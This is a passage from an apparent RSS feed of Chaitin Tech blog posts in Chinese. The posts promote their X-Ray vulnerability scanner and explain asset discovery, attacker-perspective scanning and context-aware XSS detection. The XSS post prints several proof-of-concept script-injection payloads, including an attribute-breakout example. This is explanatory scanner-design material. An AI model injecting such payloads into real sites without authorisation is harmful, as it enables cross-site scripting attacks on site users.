产品的日志，快速的对资产信息进行采集。&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;由此可见，被动资产发现的扫描策略，可以做到&lt;/p&gt;&lt;ul&gt;&lt;li&gt;精准率高，可以收集到一些主动资产发现途径难以发现的资产&lt;/li&gt;&lt;li&gt;覆盖率高、种类全，可以同时输出各个种类的资产，例如：域名、主机、服务等&lt;/li&gt;&lt;li&gt;覆盖场景全，几乎覆盖所有场景，包括设备、网站、APP等&lt;/li&gt;&lt;li&gt;省时，资产信息采集不需耗时&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;多种类多维度详细展示资产信息&lt;/b&gt;&lt;/p&gt;&lt;p&gt;洞鉴（X-Ray）在进行资产采集时，能够遨游整个网络空间，全面探测授权范围内的设备和网站资产。通过强大的资产指纹库建立各类型资产的特征，包括网络设备、安全设备、各类操作系统、数据库、应用中间件，并且会对一些特定服务加强探测，对每个资产的结果进行多样化的信息展示。&lt;/p&gt;&lt;p&gt;域名、主机、服务和web 站点的资产详细信息&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-10253fc705f760a9b0da1b9ee11afae2_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;资产统计截图&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;939&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;939&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4eea86d03820a4bb61be8545409a7cf8_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;Web 资产详情截图&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;733&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;733&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2050741221a474239881f3cbf3433ed6_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;资产间互相关联&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;洞鉴（X-Ray）将资产按照域名、主机、服务（端口）和 Web 站点进行分类展示，同时对各类资产进行互相关联，形成一种巨大的资产关联网。每个域名对应的主机、每个主机开放的服务、是否有网站等，使企业可以对自己的资产一目了然。&lt;/p&gt;&lt;p&gt;各类资产之间的关联关系如下图所示：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;522&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;522&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-09d3c167decb88a0456c51e29d139c22_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;实时监测资产的风险&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了对资产信息资源的管理，洞鉴（X-Ray）还提供了对企业资产的风险检测功能。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;支持对企业资产定时检测&lt;br&gt; 企业用户可以对关注资产设置定时扫描，在对已经发现的资产进行风险检测的同时，还可以自动发现新增的资产（新增主机、新开放的端口等），并对这些新增资产一并进行风险检测，检测完毕后企业负责人会在第一时间收到检测通知，对企业风险资产做相关说明。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;支持对企业资产应急检测&lt;br&gt; 当有新的漏洞爆出来时，洞鉴（X-Ray）可以做到第一时间更新升级，进而使企业对自己的资产进行及时检测，以保证企业资产的安全。&lt;/li&gt;&lt;/ul&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;591&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;591&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a4c3132f2024a1e38c4189462192aa87_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文从资产发现、资产关联和风险检测三个方面，讲述了洞鉴（X-Ray）对企业级资产管理与风险控制解决方案，旨在更好地帮助企业做到资产发现更全面、资产关联关系更清晰、资产风险发现更及时。感兴趣的朋友可以打开长亭官网点击试用，了解更多的产品详情。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-29-55967856</guid>
<pubDate>Tue, 29 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>洞鉴（X-Ray）手记之二 | 以攻击者视角智能探测漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-18-55204575.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/55204575&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b0eee306b34e541c1bbef7db764bdeb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;“漏洞就如同雨后蘑菇，永远都摘不完，一场大雨之后，新的蘑菇又冒出来了。”&lt;/blockquote&gt;&lt;p&gt;随着国家对网络安全的重视，公众对 Web 安全的关注聚焦，越来越多的行业领域开始将扫描器作为首选的企业安全评估系统，比如检测院所等政府机构、联通移动等大型运营商、银行证券等金融行业……然而网站环境的复杂和差异，让扫描器很难自如应对各种场景，比如： &lt;/p&gt;&lt;p&gt;* 认证使用 JWT 的网站&lt;/p&gt;&lt;p&gt;* 前端技术为主的单页应用&lt;/p&gt;&lt;p&gt;* 伪静态 Web 应用&lt;/p&gt;&lt;p&gt;* 前端路由加后端渲染模板的应用&lt;/p&gt;&lt;p&gt;* 利用 iframe 嵌套的应用&lt;/p&gt;&lt;p&gt;所以，如何智能地识别场景，帮助企业用户快速发现漏洞、识别漏洞、定位漏洞，并验证漏洞是否真实存在，成了当下亟待解决的问题。&lt;/p&gt;&lt;p&gt;而国内外主流漏扫产品均存在误报率和漏报率高、安全评估不准、扫描效率低下、不适用于复杂的网站环境等缺陷。为了解决实际场景问题，洞鉴（X-Ray）从攻击者的视角出发，智能判断场景，对漏洞进行探测和验证，从而大大提高了扫描准确率，真正起到防微杜渐的作用。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;洞鉴(X-Ray)智能探测工作模式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;扫描器在做漏洞探测时，一般都是分为以下几步进行：&lt;/p&gt;&lt;p&gt;1. 确认探测目标，建立 TCP 连接&lt;/p&gt;&lt;p&gt;2. 从数据库中提取待检测的漏洞&lt;/p&gt;&lt;p&gt;3. 根据特定扫描策略检测目标&lt;/p&gt;&lt;p&gt;4. 根据目标服务器返回的信息判断漏洞是否存在，以及给出漏洞说明、验证信息和修复建议等&lt;/p&gt;&lt;p&gt;而所谓的攻击者视角智能探测，主要体现在了两个方面，一是探测目标的收集，二是漏洞探测的匹配。这些在人工渗透测试的过程中都是凭借个人经验来进行探测的。在这里，我们赋予洞鉴（X-Ray）智能算法，以攻击者的角度从外网环境黑盒的视角智能发现攻击点。&lt;/p&gt;&lt;p&gt;以 Web 扫描为例，对于普通应用界面和伪静态界面，洞鉴（X-Ray）会采用普通爬虫进行 Web 扫描，其中在对伪静态界面扫描期间，会智能加入去重算法，对信息采集过程进行优化。而对于单页应用界面各种复杂的情况，洞鉴（X-Ray）可以采用模拟浏览器的方式进行主动扫描，或者人工触发的方式进行被动扫描，最终将采集到的目标作为扫描目标，进入漏洞探测阶段。工作原理如下图所示：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1272&quot; data-rawheight=&quot;988&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1272&quot; data-original=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1272&quot; data-rawheight=&quot;988&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1272&quot; data-original=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c8a5baf0296640edbb2d4f44c4917d0d_b.jpg&quot;&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;特色优势&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;适用场景丰富&lt;/b&gt;&lt;/p&gt;&lt;p&gt;支持对业界主流的 Web 安全攻防靶场的扫描，比如 DVWA、WebGoat、Benchmark、PentesterLab；在覆盖传统扫描器适用的场景外，洞鉴（X-Ray）也支持以下网站环境（不限于此）的扫描：&lt;/p&gt;&lt;p&gt;- 用 React、Vue 等动态生成页面的技术框架开发的网站&lt;/p&gt;&lt;p&gt;- 单页应用&lt;/p&gt;&lt;p&gt;- 利用 iframe 嵌套的应用&lt;/p&gt;&lt;p&gt;- 基于 JWT 认证网站，例如：JWT 认证一般 Token 不一定存在 Cookie 中，而是放在 Authorization 这个头中的，会定时刷新&lt;/p&gt;&lt;p&gt;- 基于 HTTP 请求头的特殊场景：token 和一个 random number 在 cookie 中，每次动态请求，服务器都会返回 Set Cookie，设置新的 token 和 random number&lt;/p&gt;&lt;p&gt;下面是洞鉴对单页 Web 应用靶场的扫描结果展示，单页应用采用 JWT 认证，网站开发涉及 React、Vue、Bootstrap 技术框架的应用，存在的漏洞有 SQL 注入、XSS、命令注入等主流漏洞。&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1151&quot; data-rawheight=&quot;886&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1151&quot; data-original=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1151&quot; data-rawheight=&quot;886&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1151&quot; data-original=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2d0f63bb2774952d536bd6d1b5e80b1e_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;验证性漏洞，准确率高&lt;/b&gt;&lt;/p&gt;&lt;p&gt;洞鉴（X-Ray）扫描出的每个漏洞都是真实验证的，货真价实。每个漏洞详情，都会给出漏洞位置、验证方式和利用方式的详细说明。既满足了没有任何技术基础的人可以读懂漏洞、验证漏洞的要求，还进一步证实了洞鉴探测漏洞的准确性。&lt;/p&gt;&lt;p&gt;洞鉴（X-Ray）支持对 DVWA 不同安全等级进行探测，探测结果如下图所示： &lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1252&quot; data-rawheight=&quot;576&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1252&quot; data-original=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1252&quot; data-rawheight=&quot;576&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1252&quot; data-original=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-bc8a7006c9765ab19b3135b699463a2a_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;安全可靠，无害验证&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个时候，可能有人会有疑问，直接验证漏洞、利用漏洞，难道不会对网站或服务器造成什么危害吗？ 比如比较典型的危害就是误删、误改业务数据等。其实针对可能会造成危害的情形，在洞鉴（X-Ray）系统中都针对性地做了特殊处理，可以说我们的 POC 在验证漏洞时是对正常业务完全无害的。类似的处理比如 ：&lt;/p&gt;&lt;p&gt;- 在探测 delete、drop 类型的 sql 注入漏洞时，我们虽然会验证漏洞，但是不会添加类似把用户信息删掉的 payload&lt;/p&gt;&lt;p&gt;- 在探测 DOS 漏洞时，洞鉴不存在 DOS 客户服务的 POC，而是通过其他维度来探测 DOS 漏洞 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;作为一家以技术为核心的网络安全公司，长亭科技将时刻关注业界动态，以前瞻性的技术格局和敏锐的攻击者思维去探索企业安全的新问题，发现网络安全世界的新规律，赋予洞鉴（X-Ray）更加智能的探测方法，以防微杜渐的安全思路，保证企业网站业务的安全可靠运行，更好地为各行各业保驾护航。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-18-55204575</guid>
<pubDate>Fri, 18 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>精细化扫描 XSS 漏洞 – 智能化场景分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-01-12-54732352.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/54732352&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-afcdb3cdf59c979edfc9d8f9c5108178_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;XSS 攻击简单、危害大&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;Web 应用的研发人员对用户的输入输出若不加以严格控制，会导致产生 XSS 漏洞。XSS 漏洞的利用方式也非常简单，普通的攻击者通过 XSS 漏洞发起攻击可以获取用户（甚至是管理员）的访问权限进行敏感操作。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;传统扫描 XSS 的方式&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;多年来，XSS 泛滥成灾，在 OWASP TOP 10 中的地位居高不下，安全研究者提出了许多 XSS 漏洞的扫描方式，我们来回顾一下：&lt;/p&gt;&lt;p&gt;&lt;b&gt;第一代 XSS 漏洞扫描&lt;/b&gt;&lt;/p&gt;&lt;p&gt;安全工作者通常喜欢用弹框（js 中的 alert 函数）来证明一个页面是否存在 XSS 漏洞，因此也诞生了一批流传非常广泛的 XSS Payload：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;
&amp;lt;body onload=alert(/xss/)&amp;gt;
&amp;lt;img src=# onerror=alert(/xss/)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;带着以上 Payload 进行访问，如果看到一个类似这样的弹框，说明漏洞真实存在。&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c7f20ab29dcf3272f2316174f0d74d4a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;413&quot; data-rawheight=&quot;131&quot; class=&quot;content_image&quot; width=&quot;413&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c7f20ab29dcf3272f2316174f0d74d4a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;413&quot; data-rawheight=&quot;131&quot; class=&quot;content_image lazy&quot; width=&quot;413&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-c7f20ab29dcf3272f2316174f0d74d4a_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-281f9969c489c6364810b367e8405c0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;153&quot; class=&quot;content_image&quot; width=&quot;410&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-281f9969c489c6364810b367e8405c0d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;153&quot; class=&quot;content_image lazy&quot; width=&quot;410&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-281f9969c489c6364810b367e8405c0d_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;第一代 XSS 漏洞扫描工具就是利用这个思路，在工具内部集成了大量 XSS Payload，在扫描时逐个进行尝试，自动将参数替换为 Payload，如果服务端的响应中包含相同的字符串就认为发现了 XSS 漏洞。&lt;/p&gt;&lt;p&gt;第一代 XSS 漏洞扫描工具填补了历史的空白，可以发现了大量初级 XSS 漏洞，但是随着 XSS 攻击的发展，衍生出了新的 XSS 攻击手段，此类工具也完成了它的历史使命，它解决不了的问题包括：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;原始 Payload 无法灵活变形，无法应对需要 DOM 渲染才能触发的 XSS 漏洞&lt;/li&gt;&lt;li&gt;输出点的部位不一定可执行，会造成误报&lt;/li&gt;&lt;li&gt;服务端有过滤逻辑时返回的字符串与原始 Payload 有差异，可能导致无法匹配响应中被过滤后的 Payload&lt;/li&gt;&lt;li&gt;如果 Content-Type 不是 text/html，即使 Payload 能够输出也无法执行&lt;/li&gt;&lt;li&gt;服务端有防护时，许多 Payload 会导致请求直接被拦截&lt;/li&gt;&lt;li&gt;等等&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;第二代 XSS 漏洞扫描&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当大量初级 XSS 漏洞被解决之后，攻击者对于 XSS 漏洞的利用方式也逐渐成熟，安全建设对于 XSS 漏洞的目标变成了“全面解决 XSS 攻击”。这个时期出现了许多思路新颖的 XSS 漏洞扫描工具，这些工具能覆盖许多第二代 XSS 漏洞扫描工具无法发现的问题，在当初的年代堪称神器，但是依然存在着或多或少的问题，因此始终无法推广到整个行业，成为可量产的 XSS 扫描基础算法。&lt;/p&gt;&lt;p&gt;第二代扫描中表现最出色的方式是调用真实浏览器来辅助判断，hook 浏览器的基础函数，累积更加庞大的 Payload 规则库，覆盖更多的输入输出场景，使浏览器告诉扫描器漏洞是否可实际被利用。这种扫描思路的特点是：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;几乎没有误报&lt;/li&gt;&lt;li&gt;可以发现部分 DOM 型 XSS&lt;/li&gt;&lt;li&gt;会发送大量 HTTP 请求&lt;/li&gt;&lt;li&gt;每次请求都需要调用浏览器进行渲染，因此扫描速度奇慢无比&lt;/li&gt;&lt;li&gt;扫描效果与 Payload 的覆盖量息息相关&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;传统方式的不足，为什么要精细化扫描 XSS 漏洞&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;无论是第一代还是第二代 XSS 漏洞扫描，都缺少了对于上下文的理解以及对于场景的分析，无法摆脱其 Fuzz 的本质，优化的方向也停留在“如何使猜测的结果更靠近真实结果”，而不是“如何正向推理得出正确答案”，因此依然由于多场景是无法解决的，问题在于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Web 业务复杂，输出点的类型非常多，payload 不可能覆盖所有的情况&lt;/li&gt;&lt;li&gt;依然无法解决 WAF 会拦截敏感 payload 的问题&lt;/li&gt;&lt;li&gt;误报漏洞的问题依然严重&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么有没有一种可以快速、深度、精准的 XSS 漏洞探测方法呢？&lt;/p&gt;&lt;p&gt;&lt;b&gt;智能化场景分析技术&lt;/b&gt;&lt;br&gt; &lt;/p&gt;&lt;p&gt;从历史的行程来看，XSS 漏洞扫描需要解决根本的问题在于对于输入输出场景的识别，对于不同浏览器渲染方式的理解，以及对于服务器处理方式的灵活应对。&lt;/p&gt;&lt;p&gt;长亭洞鉴使用了一种全新的 XSS 漏洞分析算法，脱离了传统的对于 Payload 规则库的依赖，无需大量发送 HTTP 请求即可完成页面分析，定位存在的 XSS 漏洞，并智能化生成最终的复测 Payload。&lt;/p&gt;&lt;p&gt;看一个简单的例子，有以下 URL：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//xx.chaitin.cn/test%3Fp%3D866f268a344ba71fa4b0&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xx.chaitin.cn/test?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;p=866f268a344ba71fa4b0&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用户访问后会得到如下的返回： &lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;html&amp;gt;
 &amp;lt;body&amp;gt;
 &amp;lt;a href=&quot;./news/866f268a344ba71fa4b0/&quot;&amp;gt;
 &amp;lt;img src=&quot;./xxx.png&quot;&amp;gt;
 &amp;lt;/a&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是一段可能存在 XSS 的代码，业务将用户输入的 p 参数输出到了 a 标签的 href 属性中。熟悉 XSS 的同学无需多想即可编写如下验证该漏洞的 Payload。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span&gt;&lt;/span&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;自动化扫描工具只要覆盖这个 Payload 即可验证如上的漏洞。但是这个 Payload 真的能工作么？其实还需要考虑其他因素：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;参数是否会被服务器编码或解码&lt;/li&gt;&lt;li&gt;参数中是否允许存在空格，是否有长度限制&lt;/li&gt;&lt;li&gt;会不会有 WAF 拦截 script 或 alert 等关键字&lt;/li&gt;&lt;li&gt;( 和 ) 有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;&quot; 和 &#39; 有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;&amp;lt; 和 &amp;gt; 有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;有没有其他可以利用的属性，是否可以使用 onXXX 事件，有没有可能被过滤或转义&lt;/li&gt;&lt;li&gt;有没有 CSP 策略&lt;/li&gt;&lt;li&gt;等等&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;如果是传统自动化黑盒扫描器，包含如上文“无需多想”的 Payload 已属不易，以上意外因素只要存在一点就可以使扫描铩羽而归，更难想想需要累积并尝试多少 Payload 才能实际验证一个这样的 XSS 漏洞。&lt;/p&gt;&lt;p&gt;想要精细化发现 XSS 漏洞，必须站在理解 DOM 结构的基础上，长亭洞鉴实现了兼容各种浏览器标准的 DOM 解析器，使可分析的参数输出点可以覆盖到包括但不限于以下范围：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;输出在标签外部&lt;/li&gt;&lt;li&gt;输出在 HTML 注释中&lt;/li&gt;&lt;li&gt;输出在标签的属性内部&lt;/li&gt;&lt;li&gt;输出在标签的属性外部&lt;/li&gt;&lt;li&gt;输出在标签的事件内部&lt;/li&gt;&lt;li&gt;输出在地址的部位，如 a/href、form/action、iframe/src 等&lt;/li&gt;&lt;li&gt;输出在标签的 style 属性内部&lt;/li&gt;&lt;li&gt;输出在 style 标签内&lt;/li&gt;&lt;li&gt;输出在 script 标签内的字符串中&lt;/li&gt;&lt;li&gt;输出在 script 标签内的注释中&lt;/li&gt;&lt;li&gt;输出在特殊标签内部&lt;/li&gt;&lt;li&gt;输出在特殊标签的特殊属性内部&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;除此之外，自动化工具还需要理解参数传递方式与常见编码方式，考虑如何自动化识别服务器对参数的编码方式，如何定位 Payload 中的敏感字符，并对 Payload 关键部分进行编码。洞鉴内置的编码探测算法与自动编码算法可以解决该问题，可覆盖的编码类型包括但不限于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;HTML Entity&lt;/li&gt;&lt;li&gt;HTML Code&lt;/li&gt;&lt;li&gt;HTML Hex 